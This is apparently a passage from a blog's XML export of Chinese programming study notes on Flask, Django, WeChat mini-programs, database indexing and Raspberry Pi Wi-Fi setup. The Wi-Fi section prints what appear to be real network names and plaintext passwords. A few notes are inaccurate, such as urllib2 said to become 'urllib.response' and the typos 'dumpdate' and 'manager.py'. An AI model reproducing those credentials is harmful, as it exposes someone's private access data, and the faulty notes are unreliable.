1234567891011121314151617181920判断调用 API 返回的值为 errorclass HTTP: def get(url, return_json=True): r = requests.get(url) # restful # json if r.status_code != 200: return &#123;&#125; if return_json else &apos;&apos; return r.json() if return_json else r.text # if r.status_code ==200: # if return_json: # return r.json() # else: # return r.text # else: # if return_json: # return &#123;&#125; # else: # return &apos;&apos; 建议在 多个 if else 中的代码单独提取为一个函数，以及增加 return ，提前减少分支。 staticmethod 与 classmethodpython的staticmethod,classmethod和装饰器以及闭包的爱恨情仇 笔记： 类的实例化：类是指：描述一种事物的定义，是个抽象的概念实例指：该种事物的一个具体的个体，是具体的东西打个比方：“人”是一个类。“张三”是人类的一个具体例子在编程时也是同样的道理，你先自己定义一个“类”，当你需要用时，用“类”的定义来创造一个具体的例子。用类的定义来创建一个实例，就叫做类的实例化。 两个方法之间的去别：@staticmethod不需要表示自身对象的self和自身类的cls参数，就跟使用函数一样。@classmethod也不需要self参数，但第一个参数需要是表示自身类的cls参数。如果在@staticmethod中要调用到这个类的一些属性方法，只能直接类名.属性名或类名.方法名。而@classmethod因为持有cls参数，可以来调用类的属性，类的方法，实例化对象等，避免硬编码。 什么是硬编码什么叫“硬编码”？“硬”，顾名思义，就是死板，一次性的意思。其定义也就是“将可变变量用一个固定数值表示”，这种方式在编码的过程中会导致变量很难修改。因此通常采用的方式都是软编码的方式，也即通过一个标记取代变量名称，而这个标记的值是可以不断变化的。但标记名称却是不变的，从而实现了“以不变应万变“。12345eg: int a=2,b=2; 硬编码：if(a==2) return false; 非硬编码 if(a==b) return true; （就是把数值写成常量而不是变量 ） 一个简单的版本：如求圆的面积 的问题 PI（3.14） 那么3.14*r*r 就是硬编码，而PI*r*r 就不是硬编码。 复习装饰器、闭包装饰器： 优点像 JAVA 继承，就是在使用某个函数的时候，感觉这个函数功能不能满足自己的使用，同时不能在原函数上进行修改，于是乎装饰器诞生。 闭包： 在一个外函数中定义了一个内函数，内函数里运用了外函数的临时变量，并且外函数的返回值是内函数的引用。这样就构成了一个闭包。参考链接：博客园 object 的继承问题知乎：Python 为什么要继承 object 类？ 笔记：class Http(object): 这个 object 有时候可以继承也可不继承，有什么区别？答：python3没有区别，python2有区别。 python 2 : 经典类和新式类 python 3 : 默认新式类 链式查找是个啥？？？？方法链（method chaining）是面向对象的编程语言中的一种常见语法，可以让开发者在只引用对象一次的情况下，对同一个对象进行多次方法调用。 Python中方法链的使用方法 定制类里用到了 参考教程：Python简化类例五：实现链式写法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061eg：#Python简化类例五：实现链式写法def ClassTest5(): &apos;&apos;&apos;链式写法只要是类语言都可以实写&apos;&apos;&apos; def p() :pass p.x=0 p.y=0 def o():pass def printPos(): print(&quot;当前坐标是(%d, %d)&quot;%(p.x,p.y)) def moveLeft(): p.x-=1 printPos() return o o.moveLeft=moveLeft;del moveLeft def moveTop(): p.y+=1 printPos() return o o.moveTop=moveTop;del moveTop def moveRight(): p.x+=1 printPos() return o o.moveRight=moveRight;del moveRight def moveBottom(): p.y-=1 printPos() return o o.moveBottom=moveBottom;del moveBottom return o t5=ClassTest5()t5.moveTop().moveLeft().moveBottom().moveRight()# coding=utf-8class Bar(object): passclass Foo(object): &quot;&quot;&quot;类的描述文本&quot;&quot;&quot; def __init__(self): pass def __getattr__(self, item): print(item,end=&quot; &quot;) #注意：返回的是对象自身 return self #重写str()方法 def __str__(self): return &quot;&quot;print(Foo().think.different.itcast) 定制类看到类似slots这种形如xxx的变量或者函数名就要注意，这些在Python中是有特殊用途的。 slots我们已经知道怎么用了，_ len _()方法我们也知道是为了能让class作用于len()函数。 除此之外，Python的class中还有许多这样有特殊用途的函数，可以帮助我们定制类。 廖雪峰官方教程-面向对象高级编程 python 中 self 到底是个什么玩意一篇文章让你彻底搞清楚Python中self的含义 python中self参数的作用 笔记：self代表类的实例，而非类。self在定义时需要定义，但是在调用时会自动传入。self的名字并不是规定死的，但是最好还是按照约定是用selfself总是指调用时的类的实例。 类中函数定义需要加self，类外函数定义不需要。 1234567891011121314151617eg:class Foo(object): #类中方法加入了self参数 def say_someThing(self,str): print(str)#类外方法不需要加入self参数 def say_hello(): print（&apos;hello&apos;） #类外函数使用say_hello()#类内函数使用，不需要加入self相关参数 foo=Foo()foo.say_someThing(&quot;hi&quot;) import http 爬坑http.client使用奇怪问题：ImportError: No module named ‘http.client’; ‘http’ is not a package。 解决：你的代码文件应该叫http.py了吧，这样引用变成引用自己了。改个名吧！！！！！ No module named ‘urllib2’： Python 3.3之后，urllib2改为urllib.response 1234567891011121314Python 2.7 代码：import urllib2 response = urllib2.urlopen(&apos;http://www.baidu.com/&apos;) html = response.read() print html Python 3.3+ 代码应该为：import urllib.requestresponse=urllib.request.urlopen(&apos;http://www.baidu.com&apos;)html=response.read()print(html) dict 是什么可变的字典: 不可变的字典：两种方法：1、自己继承dict 的数据结构2、直接用 flask 提供的方法 不可变字典转换为普通字典：a = request.args.to_dict() 字典是无序的。 12345678910111213dict()作用：dict() 函数用于创建一个字典。返回一个字典。语法：class dict(**kwarg)class dict(mapping, **kwarg)class dict(iterable, **kwarg)参数说明：**kwargs -- 关键字mapping -- 元素的容器。iterable -- 可迭代对象 12345678910eg:&gt;&gt;&gt;dict() # 创建空字典&#123;&#125;&gt;&gt;&gt; dict(a=&apos;a&apos;, b=&apos;b&apos;, t=&apos;t&apos;) # 传入关键字&#123;&apos;a&apos;: &apos;a&apos;, &apos;b&apos;: &apos;b&apos;, &apos;t&apos;: &apos;t&apos;&#125;&gt;&gt;&gt; dict(zip([&apos;one&apos;, &apos;two&apos;, &apos;three&apos;], [1, 2, 3])) # 映射函数方式来构造字典&#123;&apos;three&apos;: 3, &apos;two&apos;: 2, &apos;one&apos;: 1&#125; &gt;&gt;&gt; dict([(&apos;one&apos;, 1), (&apos;two&apos;, 2), (&apos;three&apos;, 3)]) # 可迭代对象方式来构造字典&#123;&apos;three&apos;: 3, &apos;two&apos;: 2, &apos;one&apos;: 1&#125;&gt;&gt;&gt; Setdict的作用是建立一组 key 和一组 value 的映射关系，dict的key是不能重复的。 有的时候，我们只想要 dict 的 key，不关心 key 对应的 value，目的就是保证这个集合的元素不会重复，这时，set就派上用场了。 set 持有一系列元素，这一点和 list 很像，但是set的元素没有重复，而且是无序的，这点和 dict 的 key很像。12345678创建 set 的方式是调用 set() 并传入一个 list，list的元素将作为set的元素：&gt;&gt;&gt; s = set([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;])可以查看 set 的内容：&gt;&gt;&gt; print sset([&apos;A&apos;, &apos;C&apos;, &apos;B&apos;])请注意，上述打印的形式类似 list， 但它不是 list，仔细看还可以发现，打印的顺序和原始 list 的顺序有可能是不同的，因为set内部存储的元素是无序的。 注意：set 里面含有中括号。 深入了解flask路由、蓝图了解路由的设计，路由的分配，404、301 老师原话：每一个url都会对应一个视图函数，但是不仅仅是这样。每一个url还会对应一个endpoint端点，用于反向构建URL。 Flask路由与蓝图Blueprint Flask源码复习之路由 Request 对象的使用官方教程 - 初级 官方教程 - 高级 验证器1234# 内置的验证器class SearchForm(Form): q = StringField(validators=[DataRequired(),Length(min=1,max=30)])#最大值，最小值，消息 page = IntegerField(validators=[NumberRange(min=1,max=99)],default=1) 1234567891011121314151617@web.route(&apos;/book/search&apos;)def search(): form = SearchForm(request.args) if form.validate(): q = form.q.data.strip() print(q) page = form.page.data print(page) isbn_or_key = is_isbn_or_key(q) print(&apos;isbn_or_key&apos;) if isbn_or_key == &apos;isbn&apos;: result = YuShuBook.search_by_isbn(q) else: result = YuShuBook.search_by_keyword(q,page) return jsonify(result) else: return jsonify(form.errors) validators 是个啥，为什么里面可以传多个函数validator.py是一个数据验证工具，确保数据符合一定的规则。一个validation是一个字典，对于字典中的每一个键，包含一个规则列表。 Github地址 简书教程:Python数据验证库（二）validator 创建数据表的方式1、Model First利用建模工具 2、Database Firs：手动创建，传统方式 3、Code First sqlalchemy、WTFORMS 适用于各个 python 的框架 Flask_SQLALchemy 适用于Flask，可以提供更方便的APIFlask_WTFORMS123456789101112131415161718eg:db = SQLAlchemy()class Book(db.Model): id = Column(Integer, primary_key=True, autoincrement=True) # 第一个参数指明传入的类型，传两个关键字属性，一个主键，一个自增长 title = Column(String(50), nullable=False) # 第二个参数关键字参数，意思是不可以为空 author = Column(String(30), default=&apos;佚名&apos;) isbn = Column(String(15)) price = Column(String(20)) binding = Column(String(20)) # 是否为精装 publisher = Column(String(50)) pages = Column(Integer) # 页数 isbn = Column(String(15), nullable=False, unique=True) # unique 唯一的 不是重复的 summary = Column(String(1000)) # 简介 image = Column(String(50)) Flask 核心机制上下文123456789from flask import Flask，current_app，request，Request app=Flask（name_）#应用上下文对象Flask#请求上下文对象Request#Flask AppContext#Request RequestContext#离线应用、单元测试ctx=app.app kontext（）ctx.push（）I a=current_app d=current_app.config[&apos;DEBUG&apos;]ctx.pop（） 栈：后进先出队列：先进先出 Flask 的核心就是玩队列的感觉。 先实例化，每一次调用函数都是可以理解为出栈、入栈。每一次 flask 会自动检查你这次的动作所需的参数，在栈里面是不是为空，如果是空的，那就自动执行入栈，用完再出栈。 什么是上下文python黑魔法—上下文管理器（contextor） 笔记： 什么是句柄什么是句柄？为什么会有句柄？HANDLE 笔记： with 语句是怎么用的。它的意义是什么博客园：with 关键字学习 12345678910eg:简化代码with app.app_context()：a = current_appd = current_app.config[&apos;DEBUG&apos;]#实现了上下文协议的对象使用with#上下文管理器# __enter__ __exit__#上下文表达式必须要返回一个上下文管理器#t with with 语句时用于对try except finally 的优化1234567f=open(&apos;file_name&apos;,&apos;r&apos;)try: r=f.read()except: passfinally: f.close() 用with的实现：12with open(&apos;file_name&apos;,&apos;r&apos;) as f: r=f.read() 这条语句就好简洁很多，当with里面的语句产生异常的话，也会正常关闭文件 自己定义可以给with调用的上下文管理器12345678910class MyResource: def __enter__(self): print(&apos; connect to resource&apos;) return self def __exit__(self, exc_type, exc_value, tb): print(&apos; close resource connection&apos;) def query(self): print(&apos; query data&apos;)with MyResource() as resource: resource. query() 笔记：懒人代码，让你少写几个关闭（收尾）代码。 遇到问题，学习再源码中找方法12345678910def create_app(): app=Flask(_name) app. config. from_object(&apos; app. secure&apos;) app. config. from_object(&apos; app. setting&apos;) register_blueprint(app) db. init_app(app) with app.app_context(): db. create_all() return app 123db. init_app(app)db. create_a11(app=app) return app Flask 中的多线程和线程隔离技术使用线程隔离的意义在于：使当前线程能够正确引用到他自己所创建的对象，而不是引用到其他线程所创建的对象 pthon 的多线程python 的 GILLocal 使用字典的方式实现的线程的隔离什么是封装LocalStack 的用法push、pop、top123456789101112131415161718192021222324s=LocalStack（）s.push（1）print（s.top）print（s.top）print（s.pop（））print（s.top）s.push（1）s.push（2）#栈后进先出print（s.top）Iprint（s.top）print（s.pop（））print（s.top）结果：111None2221 栈与数组构造函数getattr 与 setattr 方法线程隔离对象与被线程隔离对象书籍详情页面的构建ViewModel 的基本概念、以及数据处理伪面向对象：面向过程什么是面向过程重构鱼书核心对象从json序列化看代码解释权反转单页面与网站区别静态文件、模板、消息闪现与Jinja2Flask 静态文件访问原理模板文件的位置与修改方案jianjia2流程控制语句模板继承过滤器与管道命令反向构建 URL消息闪现、SecretyKey与变量作用域显示搜索结果页面、与页面结构解析]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-Django框架-微信小助手实践]]></title>
    <url>%2Fpython-Django%E6%A1%86%E6%9E%B6-%E5%BE%AE%E4%BF%A1%E5%B0%8F%E5%8A%A9%E6%89%8B%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[小程序基础全局入口 —— app.js全局配置 —— app.json全局样式 —— app.wxss 全局配置（页面导航）pages 列表配置页面 window 属性配置导航条背景/文字/等颜色 tabbar 配置12345678910111213141516 &quot;tabBar&quot;: &#123; &quot;list&quot;: [ &#123; &quot;pagePath&quot;: &quot;pages/index/index&quot;, &quot;text&quot;: &quot;首页&quot; &#125;, &#123; &quot;pagePath&quot;: &quot;pages/logs/logs&quot;, &quot;text&quot;: &quot;日志&quot; &#125;, &#123; &quot;pagePath&quot;: &quot;pages/demogrid/demogrid&quot;, &quot;text&quot;: &quot;九宫格&quot; &#125; ]&#125; 小程序的页面设置json 开启下拉刷新123&#123; &quot;enablePullDownRefresh&quot;: true&#125; 小程序的注册逻辑层app.js 小程序的注册逻辑App函数注册全局唯一的小程序只能调用一次接收一个对象作为函数参数 页面注册逻辑Page函数注册一个页面接受一个对象作为函数参数 页面数据data属性 使用全局数据获取全局唯一的 App 实例通过唯一实例获取全局数据 页面生命周期 小程序的视图层数据绑定123语法 &#123;&#123;&#125;&#125; &lt;view&gt;&#123;&#123; message &#125;&#125;&lt;/view&gt; message: &quot;Hello World, Hello Django&quot;, 列表渲染语法：wx:for 1234567891011&lt;view wx:for=&quot;&#123;&#123;array&#125;&#125;&quot;&gt; No.&#123;&#123;index&#125;&#125; item, message: &#123;&#123;item.message&#125;&#125; &lt;/view&gt; array: [ &#123; message: &quot;Hello World&quot;, &#125;, &#123; message: &quot;Hello Django&quot;, &#125; ] 条件渲染语法：wx:if wx:else wx:elif 绑定事件 绑定事件的写法以key、value的形式key以bind或者catch开头，然后跟上事件的类型12345&lt;view bindtap=&apos;tapName&apos;&gt;TapTap&lt;/view&gt; tapName: function(event)&#123; console.log(&apos; in tabName function&apos;)&#125;, 小程序框架 小程序提供的能力和常用的API微信API网络请求HTTP请求Http请求异步特性：不管是什么情况，先返回过程后返回结果。 1234567891011121314151617&lt;button bindtap=&apos;testNetwork&apos;&gt;Test Network&lt;/button&gt;testNetwork: function(event)&#123; var data = &apos;undefined&apos; wx.request(&#123; url: &apos;http://www.imooc.com&apos;, method: &apos;GET&apos;, header: &#123;&#125;, success: function(res)&#123; console.log(&apos;in success&apos;) data = res.data &#125;, fail: function(res)&#123; console.log(&apos;request failed.&apos;) &#125; &#125;) console.log(&apos;data: &apos;, data)&#125;, 文件上传、下载 *Task（网络任务对象）中断任务触发回调函数关闭连接 本地存储将数据存储在本地缓存中指定的key中，数据存储生命周期跟小程序本身一致。◆wx.setStorage◆wx.getStorage◆wx.removeStorage◆wx.clearStorage（前三个操作指定的缓存，最后一个删除所有缓存） 123456789101112131415161718 &lt;button bindtap=&apos;testStorage&apos;&gt;Test Storage&lt;/button&gt;testStorage: function()&#123; wx.setStorage(&#123; key: &apos;test&apos;, data: &apos;data&apos;, &#125;) wx.getStorage(&#123;//异步 key: &apos;test&apos;, success: function(res) &#123; var data = res.data console.log(&apos;data from storage 1: &apos;, data) &#125;, &#125;) var data = wx.getStorageSync(&apos;test&apos;)//同步 console.log(&apos;data from storage 2: &apos;, data) &#125;, 文件系统提供一个全局的问价管理系统，来实现对文件的增删改查var fs=wx. getFileSystemManager() ◆fs.saveFile◆fs.removeSavedFile◆fs.writeFile◆fs.appendFile◆fs.readFile 文件夹操作◆fs.mkdir◆fs.rmdir◆fs.isDirectory◆fs.isFile 开放能力◆用户数据◆推送消息◆运营数据 用户数据◆头像、昵称等公开信息—wx.getUserlnfo）◆openid等敏感数据 基础组件开源 Django视图层Django Response对象◆状态码——Response对象的status属性◆应答内容——Response对象的content属性◆延伸的Response子类——（JsonResponse、FileResponse） 会话管理有状态服务什么是状态无状态服务:就是没有特殊状态的服务,各个请求对于服务器来说统一无差别处理,请求自身携带了所有服务端所需要的所有参数(服务端自身不存储跟请求相关的任何数据,不包括数据库存储信息) 有状态服务:与之相反,有状态服务在服务端保留之前请求的信息,用以处理当前请求,比如session等 小程序状态：小程序与后台通信需要通过微信后台来进行转发。 小程序的状态管理在 utils 包中添加 Cookie.js 工具包，然后在里面有三个函数，取出、存储、取出。 const key = ‘cookie’ 123456789101112131415161718function getSessionIDFromResponse(res)&#123; var cookie = res.header[&apos;Set-Cookie&apos;] console.log(&apos;get cookie from response: &apos; + cookie) return cookie&#125;function setCookieToStorage(cookie) &#123; try&#123; wx.setStorageSync(key, cookie) &#125;catch(e)&#123; console.log(e) &#125;&#125;function getCookieFromStorage() &#123; var value = wx.getStorageSync(key) return value&#125; Django 的 Session 中间件 启用 Session 中间件：setting中的 MIDDLEWARE。 使用 Session 的方法：12345678910def test_session(request): request.session[&apos;message&apos;] = &apos;Test Django Session OK!&apos; response = wrap_json_response(code=ReturnCode.SUCCESS) return JsonResponse(data=response, safe=False)def test_session2(request): print(&apos;session content: &apos;, request.session.items()) response = wrap_json_response(code=ReturnCode.SUCCESS) return JsonResponse(data=response, safe=False) 1234567891011121314151617181920212223onReadCookies: function ()&#123; wx.request(&#123; url: app.globalData.serverUrl + app.globalData.apiVersion + &apos;/auth/test&apos;, success: function(res)&#123; var cookie = cookieUtil.getSessionIDFromResponse(res) console.log(cookie) cookieUtil.setCookieToStorage(cookie) var newCookie = cookieUtil.getCookieFromStorage() var header = &#123;&#125; header.Cookie = newCookie wx.request(&#123; url: app.globalData.serverUrl + app.globalData.apiVersion + &apos;/auth/test2&apos;, header: header, success: function(res)&#123; &#125; &#125;) &#125; &#125;)&#125;, 小程序登录功能 使用哪种用户体系呢 自建用户体系：邮箱、电话等标记用户；填写、去重等复杂的交互逻辑。 沿用微信用户体系：openid——微信用户的唯一识别标志。 用户模型与用户视图：用户的唯一标识；用户的基本信息。获取用户的 OpenID 12345class User(models.Model): # openid open_id = models.CharField(max_length=32, unique=True) # 昵称 nickname = models.CharField(max_length=256) 12345class UserView(View,CommonResponseMixin): def get(self, request): pass def post(self, request): pass 1234# 路径：path(&apos;user&apos;, views.UserView.as_view())# 为什么是 as.view() 步骤调用微信的 wx.login 获取临时的 code，不需要任何的参数，直接定义成功的回调函数，然后就是赋值，定义请求函数，包含请求链接、请求方式、请求内容，以及确定 GET POST 请求方式是否需要请求头，可以定义一个回调函数番薯输出登录成功。定义cookies：获取、存储、获取 问题：code 是啥？ 1234567891011121314151617181920212223242526272829authorize: function () &#123; wx.login(&#123; success: function(res)&#123; var code = res.code var appId = app.globalData.appId var nickname = app.globalData.userInfo.nickName wx.request(&#123; url: app.globalData.serverUrl + app.globalData.apiVersion + &apos;/auth/authorize&apos;, method: &apos;POST&apos;, data: &#123; //数据内容 code: code, appId: appId, nickname: nickname &#125;, header: &#123; //请求头 &apos;content-type&apos;: &apos;application/json&apos; &#125;, success: function(res)&#123; //回调函数 wx.showToast(&#123; title: &apos;授权成功&apos; &#125;) var cookie = cookieUtil.getSessionIDFromResponse(res) cookieUtil.setCookieToStorage(cookie) console.log(cookie) &#125; &#125;) &#125; &#125;)&#125;, 出现的错误： 123456789101112131415161718192021222324ModuleNotFoundError: No module named &apos;Crypto&apos;解决方法：pip install pycryptodome当然有可能会出现这种情况：看到报错后是这么安装的：pip install crypto但是运行还是报错：ModuleNotFoundError: No module named &apos;Crypto&apos;；此时需要去环境中将安装的包crypto的名字改成Crypto,首字母大写；然后再次运行，出现这个错误：ModuleNotFoundError: No module named &apos;Crypto.Cipher&apos;此时进入到安装的文件夹下，发现没有此文件：需要卸载刚才安装的包：pip uninstall crypto然后重新安装：pip install pycryptodome，即可！&quot;errcode&quot;:40029：解决方法:微信开发者工具里开发项目需要填写appID，后台请求openid也需要appID，确认appID是否一致，确认appsecret是否一致，临时登录凭证code ，appID和appsecret必须相互对应。errcode&quot;:40125：解决方法：1.代码中设置的微信APPsecret和微信开放平台不一致，需要您自己对照微信开放平台和代码中的appsecret， 检查修正。 2.由于秘钥无效导致的，秘钥如果长时间不登录，会自动重置。 完善用户的个人信息用户模型的变更修改个人信息的功能开发复杂多变的用户状态管理有状态的应用服务Index 首页的实现深入 Django 模型层跨DB迁移——模型层使用至数据库迁移迁移的必要性sqlite3在项目开发初期便利 sqlite3是文件数据库，性能跟不上 mysql是工业界非常常用的数据库 迁移的过程数据备份python manage.py dumpdate authorization &gt; authorization_data.json 表结构同步配置创建Mysql数据库并更新配置 创建slave数据库 123456789101112131415161718192021222324252627DATABASES = &#123; &apos;default&apos;: &#123; &apos;ENGINE&apos;: &apos;django.db.backends.sqlite3&apos;, &apos;NAME&apos;: os.path.join(BASE_DIR, &apos;db.sqlite3&apos;), &#125;, &apos;slave&apos;: &#123; &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;, &apos;NAME&apos;: &apos;backend&apos;, &apos;USER&apos;: &apos;root&apos;, &apos;PASSWORD&apos;: &apos;&apos;, &apos;HOST&apos;: &apos;127.0.0.1&apos;, &apos;PORT&apos;: &apos;3306&apos; &#125;&#125;# 可以同时支持多个数据库，但是仅仅只有default默认数据库挂掉以后启动第二个&apos;&apos;&apos;DATABASES = &#123; &apos;default&apos;: &#123; &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;, &apos;NAME&apos;: &apos;backend&apos;, &apos;USER&apos;: &apos;root&apos;, &apos;PASSWORD&apos;: &apos;&apos;, &apos;HOST&apos;: &apos;127.0.0.1&apos;, &apos;PORT&apos;: &apos;3306&apos; &#125;&#125; 表结构的同步 1python manager.py migrate --run-syncdb --database slave 数据迁移python manager.py loaddata authorization_data.json 数据库索引——模型层使用之索引索引的概述索引是对数据库表中一列或多列的值进行排序的一种结构，使用索引可快速访问数据库表中的特定信息。如果想按特定职员的姓来查找他或她，则与在表中搜索所有的行相比，索引有助于更快地获取信息。索引的一个主要目的就是加快检索表中数据，亦即能协助信息搜索者尽快的找到符合限制条件的记录ID的辅助数据结构。 优点：加快检索数据的速度降低插入、删除、更新的速度 应该被索引的字段需要排序操作的字段(order_by) 需要比较操作的字段(&gt; &lt;&gt;) 需要过滤操作的字段(fluter) 添加索引的两种方法属性中定义nickname = models.CharField(max_length=256,db_index=True) 模型的Meta添加索引12345class Meta: indexes = [ models.Index(fields=[&apos;nickname&apos;]), models.Index(fields=[&apos;open_id&apos;, &apos;nickname&apos;]) ] 12345678910111213组合索引是什么？组合索引建立的原则。b树和b+树的区别。一次查询只能用到一个索引，所以 首先枪毙 a，b各建索引方案a还是b？ 谁的区分度更高（同值的最少），建谁！当然，联合索引也是个不错的方案，ab，还是ba，则同上，区分度高者，在前索引用于快速找出在某个列中有一特定值的行。不使用索引，MySQL必须从第1条记录开始然后读完整个表直到找出相关的行，还需要考虑每次读入数据页的IO开销。而如果采取索引，则可以根据索引指向的页以及记录在页中的位置，迅速地读取目标页进而获取目标记录。大多数情况下都（默认）采用B树来构建索引。只是空间列类型的索引使用R-树，并且MEMORY表还支持hash索引。B树是平衡多叉树，每个节点存放多少个值取决于值所占的空间，这与每一张数据页存放多少条记录与记录信息量有关同理。节点中的值是以非降序进行排列的，节点中的值总是小于等于指向它的结点中的值。MySQL使用B树构造索引的情况下，是由叶子指向具体的页和记录的。并且一个叶子有一个指针指向下一个叶子。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465Django模型类的Meta是一个内部类，它用于定义一些Django模型类的行为特性。而可用的选项大致包含以下几类abstract这个属性是定义当前的模型是不是一个抽象类。所谓抽象类是不会对应数据库表的。一般我们用它来归纳一些公共属性字段，然后继承它的子类可以继承这些字段。Options.abstract如果abstract = True 这个model就是一个抽象类app_label这个选型只在一种情况下使用，就是你的模型不在默认的应用程序包下的models.py文件中，这时候需要指定你这个模型是哪个应用程序的。Options.app_label如果一个model定义在默认的models.py，例如如果你的app的models在myapp.models子模块下，你必须定义app_label让Django知道它属于哪一个appapp_label = &apos;myapp&apos;db_tabledb_table是指定自定义数据库表明的。Django有一套默认的按照一定规则生成数据模型对应的数据库表明。Options.db_table定义该model在数据库中的表名称 db_table = &apos;Students&apos;如果你想使用自定义的表名，可以通过以下该属性 table_name = &apos;my_owner_table&apos;db_teblespaceOptions.db_teblespace定义这个model所使用的数据库表空间。如果在项目的settin中定义那么它会使用这个值get_latest_byOptions.get_latest_by在model中指定一个DateField或者DateTimeField。这个设置让你在使用model的Manager上的lastest方法时，默认使用指定字段来排序managedOptions.managed默认值为True，这意味着Django可以使用syncdb和reset命令来创建或移除对应的数据库。默认值为True,如果你不希望这么做，可以把manage的值设置为Falseorder_with_respect_to这个选项一般用于多对多的关系中，它指向一个关联对象，就是说关联对象找到这个对象后它是经过排序的。指定这个属性后你会得到一个get_xxx_order()和set_xxx_order()的方法，通过它们你可以设置或者回去排序的对象ordering这个字段是告诉Django模型对象返回的记录结果集是按照哪个字段排序的。这是一个字符串的元组或列表，没有一个字符串都是一个字段和用一个可选的表明降序的&apos;-&apos;构成。当字段名前面没有&apos;-&apos;时，将默认使用升序排列。使用&apos;?&apos;将会随机排列ordering=[&apos;order_date&apos;] # 按订单升序排列ordering=[&apos;-order_date&apos;] # 按订单降序排列，-表示降序ordering=[&apos;?order_date&apos;] # 随机排序，？表示随机ordering=[&apos;-pub_date&apos;,&apos;author&apos;] # 以pub_date为降序，在以author升序排列permissionspermissions主要是为了在Django Admin管理模块下使用的，如果你设置了这个属性可以让指定的方法权限描述更清晰可读。Django自动为每个设置了admin的对象创建添加，删除和修改的权限。permissions = ((&apos;can_deliver_pizzas&apos;,&apos;Can deliver pizzas&apos;))proxy这是为了实现代理模型使用的，如果proxy = True,表示model是其父的代理 model unique_togetherunique_together这个选项用于：当你需要通过两个字段保持唯一性时使用。比如假设你希望，一个Person的FirstName和LastName两者的组合必须是唯一的，那么需要这样设置：unique_together = ((&quot;first_name&quot;, &quot;last_name&quot;),)一个ManyToManyField不能包含在unique_together中。如果你需要验证关联到ManyToManyField字段的唯一验证，尝试使用signal(信号)或者明确指定through属性。verbose_nameverbose_name的意思很简单，就是给你的模型类起一个更可读的名字一般定义为中文，我们：verbose_name = &quot;学校&quot;verbose_name_plural这个选项是指定，模型的复数形式是什么，比如：verbose_name_plural = &quot;学校&quot;如果不指定Django会自动在模型名称后加一个’s’ 关系映射实战有没有用到关系映射实战用到哪种关系映射1234567891011121314151617181920212223from django.db import modelsclass Wife(models.Model): passclass Husband(models.Model): wife = models.OneToOneField(Wife,on_delete=models.CASCADE) passclass Mother(models.Model): passclass Father(models.Model): Wife = models.OneToOneField(Mother, on_delete=models.DO_NOTHING) passclass YoungerBrother(models.Model): passclass ElderBrother(models.Model): father_id = models.ForeignKey(Father,on_delete=models.DO_NOTHING) younger_brother = models.ManyToManyField(YoungerBrother) pass 增删改查——模型层使用之数据库操作模型层关系映射——模型层使用之关系映射三种关系映射一对一的关系：OneToOneField 一对多的关系：ForeignKey 多对多的关系：ManyToManyfield Django MTV 中的M: ModelDjango ORM 框架优点：屏蔽数据库差异；提供迁移工具；简化开发流程.]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019年3月学习笔记]]></title>
    <url>%2F2019%E5%B9%B43%E6%9C%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[两个web框架的学习Flask Django结合微信小程序 一点小实践Django 网页动态绘图echarts 介绍ECharts，缩写来自Enterprise Charts，商业级数据图表，一个纯Javascript的图表库，可以流畅的运行在PC和移动设备上，兼容当前绝大部分浏览器（IE6/7/8/9/10/11，chrome，firefox，Safari等），底层依赖轻量级的Canvas类库ZRender，提供直观，生动，可交互，可高度个性化定制的数据可视化图表。创新的拖拽重计算、数据视图、值域漫游等特性大大增强了用户体验，赋予了用户对数据进行挖掘、整合的能力。 支持折线图（区域图）、柱状图（条状图）、散点图（气泡图）、K线图、饼图（环形图）、雷达图（填充雷达图）、和弦图、力导向布局图、地图、仪表盘、漏斗图、事件河流图等12类图表，同时提供标题，详情气泡、图例、值域、数据区域、时间轴、工具箱等7个可交互组件，支持多图表、组件的联动和混搭展现。 官网介绍 pyecharts 介绍牛逼就是了，支持 jupyter、Flask、Django、web框架整合。 开发文档 Django 上使用pyecharts参考教程原链接 jupytervs code 配置 C++ 编译环境1231、i686 与 行x86_64这个好理解，既然下载的是MinGW-w64，当然就要选x86_64，否则下载Mingw的纯32就行了。2、如果没有跨平台编译需求，就选win32。如果有的话选posix。3、dwarf、sjlj 的异常模型选择，推荐使用dwarf即所谓dw2，这个模型便于调试。不过出来的东西较sjlj的东西体量稍大些。 树莓派启动 wifi 并且配置 wifi使用图形界面： 这个很简单了，我们只要像以往的Linux系统一样，在右上角的菜单栏里面选择wifi，输入密码就可以了。 使用命令行： 当然，对于木有显示器的童靴，只能通过ssh来完成了。 12345678910111213141516171819202122232425262728291.可以通过如下的命令查看树莓派已经识别的wifisudo iwlist wlan0 scan 2.配置wifi信息：vim /etc/wpa_supplicant/wpa_supplicant.confctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev update_config=1 country=GB network=&#123; ssid=&quot;miracleSmallSize&quot; psk=&quot;123581321&quot; key_mgmt=WPA-PSK &#125; network=&#123; ssid=&quot;PDCN&quot; psk=&quot;qwe123456&quot; key_mgmt=WPA-PAK &#125;network=&#123; ssid=&quot;HUAWEI P10&quot; psk=&quot;1427286119&quot; key_mgmt=WPA-PSK&#125; C++ 算法的一点研究]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>flask</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019年2月学习笔记]]></title>
    <url>%2F2019%E5%B9%B42%E6%9C%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
